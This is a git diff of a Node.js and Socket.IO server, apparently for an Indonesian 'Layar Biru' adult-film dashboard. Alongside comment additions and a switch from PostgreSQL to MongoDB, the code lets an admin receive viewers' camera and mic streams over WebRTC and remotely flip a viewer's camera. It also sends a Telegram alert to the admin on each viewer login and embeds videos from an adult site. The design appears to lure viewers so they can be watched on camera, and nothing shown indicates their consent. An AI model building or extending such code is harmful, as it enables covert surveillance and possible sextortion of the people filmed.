@@ -91,7 +91,7 @@ function getSessionsPayload() {
     id:        s.id,
     name:      s.user.name,
     initial:   s.user.initial,
-    email:     s.user.name,
+    email:     s.user.name, // gunakan name sebagai identifier
     film:      s.film,
     camActive: s.camActive,
     micActive: s.micActive,
@@ -105,6 +105,7 @@ function generateInitial(fullName) {
   const parts = fullName.trim().split(/\s+/);
   if (parts.length === 0) return 'U';
   if (parts.length === 1) return parts[0].substring(0, 1).toUpperCase();
+  // Ambil huruf pertama dari 2 kata pertama
   return (parts[0].substring(0, 1) + parts[1].substring(0, 1)).toUpperCase();
 }
 
@@ -113,9 +114,9 @@ function generateInitial(fullName) {
 // ===========================
 const io = new Server(server, {
   cors: { origin: '*', methods: ['GET','POST'] },
-  transports: ['polling', 'websocket'],
-  pingInterval: 20000,
-  pingTimeout:  30000,
+  transports: ['polling', 'websocket'],   // polling dulu → upgrade ke WS (lebih stabil di Railway)
+  pingInterval: 20000,                    // kirim ping setiap 20 detik
+  pingTimeout:  30000,                    // timeout setelah 30 detik tidak ada pong
   upgradeTimeout: 10000,
   allowEIO3: true
 });
@@ -142,6 +143,7 @@ io.on('connection', (socket) => {
     socket.on('register-viewer', ({ sessionId }) => {
       socket._sessionId = sessionId;
       socket.join(`viewer:${sessionId}`);
+      // Beritahu semua admin ada viewer baru
       io.to('admins').emit('viewer-connected', { sessionId, user });
       console.log(`[SIO] Viewer terhubung: ${user.name} (${sessionId})`);
     });
@@ -154,6 +156,7 @@ io.on('connection', (socket) => {
       io.to('admins').emit('ice-candidate', { ...msg, from: 'viewer' });
     });
 
+    // Teruskan feedback flip kamera ke semua admin
     socket.on('flip-camera-accepted', ({ sessionId }) => {
       if (!sessionId) return;
       io.to('admins').emit('flip-camera-accepted', { sessionId });
@@ -179,6 +182,7 @@ io.on('connection', (socket) => {
     socket.join('admins');
 
     socket.on('register-admin', () => {
+      // Kirim daftar viewer yang sudah aktif
       const viewers = [];
       io.sockets.sockets.forEach(s => {
         if (s._role === 'viewer' && s._sessionId) {
@@ -197,8 +201,10 @@ io.on('connection', (socket) => {
       io.to(`viewer:${msg.sessionId}`).emit('ice-candidate', { ...msg, from: 'admin' });
     });
 
+    // Admin meminta viewer membalik kamera (depan/belakang)
     socket.on('flip-camera', ({ sessionId }) => {
       if (!sessionId) return;
+      // Cek apakah viewer target masih terhubung
       const targetRoom = io.sockets.adapter.rooms.get(`viewer:${sessionId}`);
       if (!targetRoom || targetRoom.size === 0) {
         socket.emit('flip-camera-rejected', { sessionId });
@@ -226,65 +232,102 @@ app.get('/api/health', (req, res) => {
   });
 });
 
-// CHECK ADMIN
+// CHECK ADMIN — Cek apakah username adalah admin
 app.post('/api/check-admin', (req, res) => {
   const { name } = req.body;
+  
   if (!name || !name.trim()) {
-    return res.status(400).json({ success: false, isAdmin: false, message: 'Nama wajib diisi.' });
+    return res.status(400).json({ 
+      success: false, 
+      isAdmin: false,
+      message: 'Nama wajib diisi.' 
+    });
   }
-  const isAdmin = name.trim().toLowerCase() === 'admin';
+
+  const trimmedName = name.trim().toLowerCase();
+  
+  // Cek apakah nama adalah admin username (yungz)
+  const isAdmin = trimmedName === 'admin';
+  
   res.json({
     success: true,
-    isAdmin,
+    isAdmin: isAdmin,
     message: isAdmin ? 'Admin terdeteksi, silakan masukkan password' : 'Username tidak terdaftar sebagai admin'
   });
 });
 
-// LOGIN
+// LOGIN — Dengan nama dan optional password untuk admin
 app.post('/api/login', async (req, res) => {
   const { name, password } = req.body;
+  
   if (!name || !name.trim()) {
-    return res.status(400).json({ success: false, code: 'MISSING_NAME', message: 'Nama wajib diisi.' });
+    return res.status(400).json({ 
+      success: false, 
+      code: 'MISSING_NAME', 
+      message: 'Nama wajib diisi.' 
+    });
   }
 
   const trimmedName = name.trim();
   const trimmedNameLower = trimmedName.toLowerCase();
 
+  // Cek apakah ini admin
   if (trimmedNameLower === 'admin') {
+    // Ini admin, validasi password
     if (!password) {
-      return res.status(401).json({ success: false, code: 'PASSWORD_REQUIRED', message: 'Password admin wajib diisi.' });
+      return res.status(401).json({
+        success: false,
+        code: 'PASSWORD_REQUIRED',
+        message: 'Password admin wajib diisi.'
+      });
     }
+
     if (password !== ADMIN_USER.password) {
-      return res.status(401).json({ success: false, code: 'WRONG_PASSWORD', message: 'Password admin salah.' });
+      return res.status(401).json({
+        success: false,
+        code: 'WRONG_PASSWORD',
+        message: 'Password admin salah.'
+      });
     }
+
+    // Password benar, login sebagai admin
     const token = jwt.sign(
       { name: 'Admin', initial: 'YZ', role: 'admin' },
       JWT_SECRET,
       { expiresIn: '8h' }
     );
-    console.log(`[LOGIN] Admin`);
-    return res.json({ success: true, token, user: { name: 'Admin', initial: 'YZ', role: 'admin' } });
+    console.log(`[LOGIN] Admin: Wnot`);
+    return res.json({
+      success: true,
+      token,
+      user: { name: 'Admin', initial: 'YZ', role: 'admin' }
+    });
   }
 
-  // Viewer
+  // Bukan admin - login sebagai viewer
   const initial = generateInitial(trimmedName);
+
+  // Cleanup sesi lama dengan nama yang sama agar tidak double card di admin
   for (const [oldToken, s] of activeSessions) {
     if (s.name && s.name.toLowerCase() === trimmedNameLower) {
       activeSessions.delete(oldToken);
+      console.log(`[LOGIN] Sesi lama ${trimmedName} dihapus sebelum login ulang`);
     }
   }
 
   const token = jwt.sign(
-    { name: trimmedName, initial, role: 'viewer' },
+    { name: trimmedName, initial: initial, role: 'viewer' },
     JWT_SECRET,
     { expiresIn: '8h' }
   );
 
   console.log(`[LOGIN] Viewer: ${trimmedName}`);
-  broadcastNewLogin({ name: trimmedName, initial, role: 'viewer' });
+  // Notifikasi ke semua admin SSE bahwa ada pengguna baru masuk
+  broadcastNewLogin({ name: trimmedName, initial: initial, role: 'viewer' });
 
+  // Kirim notifikasi Telegram ke admin
   const waktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Jakarta' });
-  const totalSesi = activeSessions.size + 1;
+  const totalSesi = activeSessions.size + 1; // +1 karena sesi baru belum masuk activeSessions
   sendTelegramNotif(
 `🟢 <b>Pengguna Baru Masuk</b>
 
@@ -295,7 +338,11 @@ app.post('/api/login', async (req, res) => {
 — <i>Layar Biru Dashboard</i>`
   );
 
-  res.json({ success: true, token, user: { name: trimmedName, initial, role: 'viewer' } });
+  res.json({
+    success: true,
+    token,
+    user: { name: trimmedName, initial: initial, role: 'viewer' }
+  });
 });
 
 app.get('/api/verify', (req, res) => {
@@ -312,7 +359,7 @@ app.post('/api/session/start', (req, res) => {
     const user = jwt.verify(token, JWT_SECRET);
     activeSessions.set(token, {
       id:        token.slice(-8),
-      user,
+      user, 
       startTime: Date.now(),
       film:      req.body.film || '—',
       camActive: req.body.camActive !== false,
@@ -347,6 +394,8 @@ app.post('/api/logout', (req, res) => {
       activeSessions.delete(token);
       broadcastSessions();
       console.log(`[LOGOUT] ${d.name}`);
+
+      // Notifikasi Telegram hanya untuk viewer
       if (d.role === 'viewer') {
         const waktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Jakarta' });
         sendTelegramNotif(
@@ -374,7 +423,7 @@ app.get('/api/sessions', (req, res) => {
   } catch { res.status(401).json({ success:false }); }
 });
 
-// SSE stream untuk admin
+// SSE stream untuk admin (stats counter)
 app.get('/api/sessions/stream', (req, res) => {
   try { jwt.verify(req.query.token, JWT_SECRET); } catch { return res.status(401).end(); }
   res.setHeader('Content-Type',  'text/event-stream');
@@ -383,13 +432,14 @@ app.get('/api/sessions/stream', (req, res) => {
   res.flushHeaders();
   res.write(`data: ${JSON.stringify({ type:'sessions', data: getSessionsPayload() })}\n\n`);
   sseClients.add(res);
+  // Heartbeat setiap 20 detik agar SSE tidak di-cut Railway (max 5 menit idle)
   const hb = setInterval(() => {
     try { res.write(`: ping\n\n`); } catch {}
   }, 20000);
   req.on('close', () => { clearInterval(hb); sseClients.delete(res); });
 });
 
-// Cleanup sesi timeout
+// Cleanup sesi timeout (tidak ping > 30 detik)
 setInterval(() => {
   const now = Date.now(); let changed = false;
   for (const [token, s] of activeSessions) {
@@ -399,15 +449,30 @@ setInterval(() => {
 }, 10000);
 
 
-// ================================================================
-// FILMS — PostgreSQL (Railway)
-// ================================================================
-const { Pool } = require('pg');
 
-const pool = new Pool({
-  connectionString: process.env.DATABASE_URL,
-  ssl: { rejectUnauthorized: false }
-});
+
+
+// ================================================================
+// FILMS — Persistent via MongoDB
+// ================================================================
+const { MongoClient } = require('mongodb');
+
+const MONGO_URI = process.env.MONGODB_URI;
+let db = null;
+
+async function connectMongo() {
+  try {
+    const client = new MongoClient(MONGO_URI);
+    await client.connect();
+    db = client.db('layar_biru');
+    console.log('[MONGO] Terhubung ke MongoDB Atlas');
+  } catch (err) {
+    console.error('[MONGO] Gagal konek:', err.message);
+  }
+}
+connectMongo();
+
+function filmsCol() { return db?.collection('films'); }
 
 const GRADIENTS_POOL = [
   'linear-gradient(135deg,#1a1a2e,#16213e)',
@@ -421,52 +486,6 @@ const GRADIENTS_POOL = [
   'linear-gradient(135deg,#0d0d0d,#3a0ca3)',
   'linear-gradient(135deg,#10002b,#e0aaff)',
 ];
-
-// Buat tabel + seed dari films.js jika tabel masih kosong
-async function initDB() {
-  try {
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS films (
-        id        SERIAL PRIMARY KEY,
-        title     TEXT NOT NULL,
-        desc      TEXT NOT NULL,
-        "videoId" TEXT NOT NULL UNIQUE,
-        thumb     TEXT NOT NULL,
-        embed     TEXT NOT NULL,
-        gradient  TEXT NOT NULL,
-        duration  TEXT NOT NULL DEFAULT '1h 30m'
-      )
-    `);
-    console.log('[PG] Tabel films siap');
-
-    // Seed dari films.js hanya jika tabel kosong
-    const { rows } = await pool.query('SELECT COUNT(*) FROM films');
-    if (parseInt(rows[0].count) === 0) {
-      try {
-        const { FILMS } = require('./public/js/films');
-        for (let i = 0; i < FILMS.length; i++) {
-          const f = FILMS[i];
-          await pool.query(
-            `INSERT INTO films (title, desc, "videoId", thumb, embed, gradient, duration)
-             VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT ("videoId") DO NOTHING`,
-            [
-              f.title, f.desc, f.videoId, f.thumb,
-              f.embed || `https://www.xvideos.com/embedframe/${f.videoId}`,
-              f.gradient || GRADIENTS_POOL[i % GRADIENTS_POOL.length],
-              f.duration || '1h 30m'
-            ]
-          );
-        }
-        console.log(`[PG] ${FILMS.length} film di-seed dari films.js`);
-      } catch (e) {
-        console.warn('[PG] Seed dari films.js gagal:', e.message);
-      }
-    }
-  } catch (err) {
-    console.error('[PG] initDB error:', err.message);
-  }
-}
-initDB();
 
 function verifyAdmin(req, res) {
   const token = (req.headers['authorization'] || '').split(' ')[1];
@@ -483,11 +502,13 @@ function verifyAdmin(req, res) {
 // GET /api/films — ambil semua film
 app.get('/api/films', async (req, res) => {
   try {
-    const { rows } = await pool.query('SELECT * FROM films ORDER BY id ASC');
-    res.json({ success: true, films: rows });
+    const col = filmsCol();
+    if (!col) return res.json({ success: true, films: [] });
+    const films = await col.find({}, { projection: { _id: 0 } }).sort({ id: 1 }).toArray();
+    res.json({ success: true, films });
   } catch (err) {
     console.error('[FILMS] GET error:', err.message);
-    res.status(500).json({ success: false, message: 'Gagal mengambil data film' });
+    res.json({ success: true, films: [] });
   }
 });
 
@@ -500,23 +521,27 @@ app.post('/api/films', async (req, res) => {
     return res.status(400).json({ success: false, message: 'Field title, desc, videoId, thumb wajib diisi' });
 
   try {
-    const countRes = await pool.query('SELECT COUNT(*) FROM films');
-    const count    = parseInt(countRes.rows[0].count);
-    const gradient = GRADIENTS_POOL[count % GRADIENTS_POOL.length];
-    const embed    = `https://www.xvideos.com/embedframe/${videoId}`;
+    const col = filmsCol();
+    if (!col) return res.status(500).json({ success: false, message: 'Database tidak tersedia' });
 
-    const { rows } = await pool.query(
-      `INSERT INTO films (title, desc, "videoId", thumb, embed, gradient, duration)
-       VALUES ($1,$2,$3,$4,$5,$6,$7)
-       RETURNING *`,
-      [title, desc, videoId, thumb, embed, gradient, duration || '1h 30m']
-    );
+    const exists = await col.findOne({ videoId });
+    if (exists) return res.status(400).json({ success: false, message: 'Video ID sudah ada' });
 
+    const all    = await col.find({}).toArray();
+    const nextId = all.length > 0 ? Math.max(...all.map(f => f.id || 0)) + 1 : 1;
+
+    const newFilm = {
+      id:       nextId,
+      title, desc, videoId, thumb,
+      embed:    `https://www.xvideos.com/embedframe/${videoId}`,
+      gradient: GRADIENTS_POOL[all.length % GRADIENTS_POOL.length],
+      duration: duration || '1h 30m'
+    };
+
+    await col.insertOne({ ...newFilm });
     console.log(`[FILMS] Ditambahkan: ${title}`);
-    res.json({ success: true, film: rows[0] });
+    res.json({ success: true, film: newFilm });
   } catch (err) {
-    if (err.code === '23505') // unique violation
-      return res.status(400).json({ success: false, message: 'Video ID sudah ada' });
     console.error('[FILMS] POST error:', err.message);
     res.status(500).json({ success: false, message: 'Gagal menyimpan film' });
   }
@@ -527,14 +552,13 @@ app.delete('/api/films/:videoId', async (req, res) => {
   if (!verifyAdmin(req, res)) return;
 
   try {
-    const { rowCount } = await pool.query(
-      'DELETE FROM films WHERE "videoId" = $1',
-      [req.params.videoId]
-    );
-    if (rowCount === 0)
+    const col    = filmsCol();
+    if (!col) return res.status(500).json({ success: false, message: 'Database tidak tersedia' });
+
+    const result = await col.deleteOne({ videoId: req.params.videoId });
+    if (result.deletedCount === 0)
       return res.status(404).json({ success: false, message: 'Film tidak ditemukan' });
 
-    console.log(`[FILMS] Dihapus videoId: ${req.params.videoId}`);
     res.json({ success: true });
   } catch (err) {
     console.error('[FILMS] DELETE error:', err.message);
@@ -557,15 +581,20 @@ server.listen(PORT, () => {
 });
 
 // ===========================
-// GRACEFUL SHUTDOWN
+// GRACEFUL SHUTDOWN (Railway SIGTERM)
 // ===========================
 function gracefulShutdown(signal) {
   console.log(`\n[${signal}] Menutup server dengan graceful...`);
+
+  // Beritahu semua client bahwa server akan restart
   io.emit('server-restart', { message: 'Server sedang restart, harap refresh.' });
+
   server.close(() => {
     console.log('[SHUTDOWN] HTTP server ditutup.');
     process.exit(0);
   });
+
+  // Paksa keluar setelah 8 detik jika ada yang gantung
   setTimeout(() => {
     console.error('[SHUTDOWN] Timeout, force exit.');
     process.exit(1);
